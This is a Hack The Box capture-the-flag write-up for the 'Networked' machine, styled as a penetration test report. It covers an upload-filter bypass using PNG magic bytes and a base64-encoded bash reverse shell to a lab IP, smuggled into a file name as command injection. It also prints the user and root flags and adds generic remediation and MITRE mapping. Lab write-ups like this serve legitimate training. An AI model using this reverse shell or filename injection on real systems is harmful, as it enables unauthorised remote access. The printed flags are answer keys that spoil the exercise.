---
title: "OffSec Assessment: Networked (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Networked (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_01.png"
---

# Offensive Security Assessment Report: Networked

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Networked** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Public-Facing Network Service Exploitation
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Networked |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Easy |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Public-Facing Network Service Exploitation
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

> **Assessment Query / Target Milestone:** Which version of Apache is running on the target?

* **Observed Evidence / Output:** 2.4.6


![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.



> **Assessment Query / Target Milestone:** What is the relative path of the directory that contains the backup file on the webserver?

* **Observed Evidence / Output:** /backup


![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.


**After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .)**

* **Observed Evidence / Output:** png


![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.


MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters)

* **Observed Evidence / Output:** 89504E470D0A1A0A


![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.


hexedit


![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.


**On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux?**

* **Observed Evidence / Output:** cron


![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.


**According to the backup of the crontab file for guly, the `check_attack.php` script is executed every how many minutes?**

* **Observed Evidence / Output:** 3


![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.


**In the** `check_attack.php` **script, there is one variable that can be controlled by us *and* is used in the call of a dangerous function. What is that variable name (including the leading** `$`**)?**

* **Observed Evidence / Output:** $value


![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.


**Submit the flag located in the guly user's home directory.**

* **Observed Evidence / Output:** e5a5724d0677418e852a52b23e8f35ea


![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"' | base64
cd /var/www/html/uploads
touch 'x;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMSI= | base64 -d | bash'

```


> **Assessment Query / Target Milestone:** What is the name of the script that guly can run as root without a password?

* **Observed Evidence / Output:** changename.sh


![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_11.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


**Submit the flag located in root's home directory.**

* **Observed Evidence / Output:** 150cf7faa877b907fe2de2d25514e0c2


![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_12.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
